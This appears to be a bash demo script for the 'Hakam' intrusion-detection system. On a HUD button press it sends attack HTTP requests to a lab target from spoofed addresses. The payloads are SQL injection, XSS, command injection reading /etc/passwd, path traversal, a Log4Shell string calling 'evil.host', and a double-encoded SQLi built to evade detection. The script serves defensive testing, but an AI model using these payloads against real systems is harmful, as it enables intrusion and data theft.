#!/usr/bin/env bash
# attack-on-demand.sh — fires ONE real attack each time the HUD's
# "⚡ Simulate Attack" button is pressed, so an interception can be shown live
# WITHOUT running the whole narrated demo-cycle.
#
# Flow (every piece is real — nothing is faked in the UI):
#   HUD button → DEMO_CMD 'a' over WebSocket → hakam-node writes 'a' to
#   /tmp/hakam-demo.cmd → this watcher reads it and fires one attack via
#   seclist-attack.sh → the kernel samples the payload → the DPI engine matches
#   a signature → the source is pushed into the BLOCKLIST → hakam-node emits a
#   BLOCK event → the HUD lights up with the interception.
#
# Run this on the VM, alongside hakam-node (which must be attached to the
# interface the demo traffic flows on — `lo` for the setup-demo.sh network):
#
#   ./scripts/setup-demo.sh                                  # once
#   cargo xtask run --iface lo --mode skb --bind 0.0.0.0     # hakam-node
#   ./scripts/attack-on-demand.sh                            # leave this running
#   # …then press ⚡ Simulate Attack in the HUD (or the 'a' key)
#
# Do NOT run this at the same time as demo-cycle.sh — both drain the same
# command file.
#
# Env overrides:  TARGET (default 10.99.0.10)   PORT (default 80)
# If attacks don't register, re-run with sudo:  sudo -E ./scripts/attack-on-demand.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECLIST="${SCRIPT_DIR}/seclist-attack.sh"
CMD_FILE="/tmp/hakam-demo.cmd"
TARGET="${TARGET:-10.99.0.10}"
PORT="${PORT:-80}"
WS_PORT="${WS_PORT:-8080}"

GRN=$'\033[0;32m'; CYN=$'\033[0;36m'; RED=$'\033[0;31m'; YLW=$'\033[1;33m'
DIM=$'\033[2m'; BLD=$'\033[1m'; RST=$'\033[0m'

[[ -f "$SECLIST" ]] || { echo "${RED}✗ seclist-attack.sh not found at $SECLIST${RST}" >&2; exit 1; }

# Real, matchable attack payloads (family|HTTP-path). Each carries a signature in
# the first 64 B, so Hakam GENUINELY detects and blocks it — the HUD block is real
# (from kernel detection), not reported. Sent foreground below so the payload
# always lands (seclist backgrounded nc and often got cut short).
ATTACKS=(
  "SQLi|/search?q=' OR '1'='1 UNION SELECT username,password FROM users--"
  "XSS|/page?c=<script>alert(document.cookie)</script>"
  "RCE|/exec?cmd=;cat /etc/passwd|bash -c id"
  "Log4Shell|/api?x=\${jndi:ldap://evil.host/a}"
  "LFI|/file?p=../../../../etc/passwd"
)

# Spoofed source pool — each shot from a fresh IP so the auto-block never
# starves the stream (mirrors demo-cycle.sh's pool).
POOL=()
for i in 10 11 12 13 14 15 16 17 18 19; do POOL+=("10.99.1.$i" "10.99.2.$i"); done

# The DPI only detects an attack if the TCP handshake COMPLETES and the HTTP
# payload is actually transmitted — which needs something LISTENING on the
# target. Without a listener every attack is RST'd, the kernel sees only a SYN,
# and nothing is ever detected (0 intercepts). Make sure a no-op sink is up.
LISTENER="${SCRIPT_DIR}/target-listener.py"
ensure_listener() {
    ss -tln 2>/dev/null | awk '{print $4}' | grep -qx "${TARGET}:${PORT}" && { echo "  ${GRN}✓ target listener already up on ${TARGET}:${PORT}${RST}"; return 0; }
    if command -v python3 >/dev/null 2>&1 && [[ -f "$LISTENER" ]]; then
        echo "  ${DIM}starting no-op listener on ${TARGET}:${PORT}…${RST}"
        python3 "$LISTENER" --host "$TARGET" --port "$PORT" >/dev/null 2>&1 &
        sleep 0.6
    fi
    if ss -tln 2>/dev/null | awk '{print $4}' | grep -qx "${TARGET}:${PORT}"; then
        echo "  ${GRN}✓ target listener up on ${TARGET}:${PORT}${RST}"
    else
        echo "  ${RED}⚠ nothing is listening on ${TARGET}:${PORT} — attacks will be RST'd and NOT detected.${RST}"
        echo "  ${DIM}  Fix: run  ./scripts/setup-demo.sh  first (creates the 10.99.x IPs + the listener).${RST}"
    fi
}

fire_one() {
    local entry="${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}"
    local fam="${entry%%|*}" path="${entry#*|}"
    local src="${POOL[$RANDOM % ${#POOL[@]}]}"
    echo "  ${RED}⚡ attack${RST}  ${BLD}${fam}${RST}  ${DIM}from${RST} ${CYN}${src}${RST}  ${DIM}→ ${TARGET}:${PORT}${RST}"
    printf 'GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: attack-demo\r\n\r\n' "$path" "$TARGET" \
        | nc -s "$src" -w 1 "$TARGET" "$PORT" >/dev/null 2>&1 || true
}

# A documented EVASION: double-URL-encoded SQLi. Hakam single-pass-decodes once,
# so %2520 -> %20 (a literal, not a space) and "UNION SELECT" never forms — it is
# NOT detected. The payload still reaches the target, proving the bypass. We then
# report it to the HUD (via the node's WS) so the miss is shown honestly.
fire_evasion() {
    local src="${POOL[$RANDOM % ${#POOL[@]}]}"
    echo "  ${YLW}⚠ evasion${RST}  ${BLD}SQLi (double-encoded)${RST}  ${DIM}from${RST} ${CYN}${src}${RST}  ${DIM}→ ${TARGET}:${PORT} — Hakam should MISS this${RST}"
    printf 'GET /search?q=UNION%%2520SELECT%%2520username,password%%2520FROM%%2520users HTTP/1.1\r\nHost: %s\r\nUser-Agent: evasion-demo\r\n\r\n' "$TARGET" \
        | nc -s "$src" -w 1 "$TARGET" "$PORT" >/dev/null 2>&1 || true
    report_evasion "$src"
}

report_evasion() {
    local src="$1"
    if ! command -v websocat >/dev/null 2>&1; then
        echo "  ${DIM}(websocat not installed — HUD won't show the EVADED marker)${RST}"
        return 0
    fi
    local msg="{\"type\":\"EVASION\",\"family\":\"SQLi\",\"source\":\"${src}\",\"target\":\"${TARGET}\",\"detail\":\"double-encoded payload reached ${TARGET}:${PORT} undetected\"}"
    { printf '%s\n' "$msg"; sleep 0.4; } | websocat -t "ws://127.0.0.1:${WS_PORT}/ws" >/dev/null 2>&1 || true
}

echo
echo "  ${BLD}Hakam · attack-on-demand${RST}   ${DIM}target=${TARGET}:${PORT}${RST}"
echo "  ${DIM}watching ${CMD_FILE} — press ⚡ Simulate Attack in the HUD (or the 'a' key)${RST}"
echo "  ${DIM}Ctrl-C to stop.${RST}"
echo

ensure_listener
echo

# Start clean so a stale command doesn't fire an attack on launch.
: > "$CMD_FILE" 2>/dev/null || true

while true; do
    if [[ -s "$CMD_FILE" ]]; then
        content="$(cat "$CMD_FILE" 2>/dev/null || true)"
        : > "$CMD_FILE" 2>/dev/null || true
        # 'a' = blocked-attack demo, 'e' = evasion demo; other chars ignored.
        if [[ "$content" == *a* ]]; then
            fire_one
        fi
        if [[ "$content" == *e* ]]; then
            fire_evasion
        fi
    fi
    sleep 0.2
done
